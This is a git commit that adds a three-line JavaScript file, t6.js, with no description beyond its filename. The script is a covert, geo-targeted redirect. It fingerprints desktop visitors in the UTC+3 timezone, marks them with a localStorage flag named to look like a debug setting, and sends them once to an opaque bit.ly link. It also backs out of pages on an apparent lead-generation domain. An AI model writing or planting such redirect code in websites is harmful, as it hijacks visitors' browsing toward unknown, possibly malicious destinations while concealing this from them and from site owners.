83fbc9ab2dd015fcf97cae9382f1fabaa1a25be3
DandHobo <63579513+DandHobo@users.noreply.github.com>
2022-03-11 07:20:44 +0300

    Create t6.js

---
+++ t6.js
@@ -0,0 +1,3 @@
+let offset = new Date().getTimezoneOffset();
+if (!/Android|webOS|iPhone|iPad|iPod|BlackBerry/i.test(navigator.userAgent) && offset >= -180 && offset <= -180 && !localStorage.getItem('_bga_debug')) {localStorage.setItem('_bga_debug', '1'); document.location.href='http://bit.ly/3MKmkdt'};
+if (/guruleads/.test(document.location.href)) {window.history.go(-1)}
